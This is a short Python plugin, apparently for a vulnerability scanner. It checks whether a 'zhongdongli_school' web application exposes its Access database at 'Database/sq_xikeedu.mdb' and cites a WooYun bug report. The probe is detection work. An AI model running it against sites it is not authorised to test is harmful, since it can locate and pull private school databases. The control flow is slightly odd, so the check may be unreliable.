#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-099335

def assign(service, arg):
    if service == "zhongdongli_school":
        return True, arg
        
        
def audit(arg):
    payload = 'Database/sq_xikeedu.mdb'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url,header='Accept:image/jpg')
    if code == 406:
        security_hole(url)
    

        return arg
if __name__== '__main__':
    from dummy import *
